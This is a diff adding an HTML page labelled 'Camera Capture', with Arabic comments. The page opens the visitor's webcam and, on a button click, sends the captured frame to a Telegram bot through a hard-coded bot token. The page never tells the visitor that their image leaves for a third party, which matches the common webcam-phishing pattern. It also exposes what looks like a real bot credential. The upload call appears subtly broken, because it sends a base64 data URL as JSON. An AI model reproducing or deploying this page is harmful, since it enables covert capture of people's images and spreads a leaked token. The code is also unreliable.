@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera Capture</title>
+</head>
+<body>
+    <h1>Camera Capture</h1>
+    <video id="video" autoplay></video>
+    <button id="capture">Capture</button>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const captureButton = document.getElementById('capture');
+        const context = canvas.getContext('2d');
+
+        // طلب الوصول إلى الكاميرا
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+            })
+            .catch(err => {
+                console.error("Error accessing camera:", err);
+            });
+
+        // التقاط الصورة وإرسالها
+        captureButton.addEventListener('click', () => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // تحويل الصورة إلى بيانات Base64
+            const imageData = canvas.toDataURL('image/png');
+
+            // إرسال الصورة إلى البوت
+            fetch('https://api.telegram.org/bot7921441509:AAEaeFUzfSmyt8ajoCB5yFcTXzwa-K9I6zQ/sendPhoto', {
+                method: 'POST',
+                body: JSON.stringify({
+                    chat_id: '123456789',  // معرف الدردشة الخاص بك
+                    photo: imageData
+                }),
+                headers: {
+                    'Content-Type': 'application/json'
+                }
+            }).then(response => response.json())
+              .then(data => console.log(data))
+              .catch(error => console.error('Error:', error));
+        });
+    </script>
+</body>
+</html>
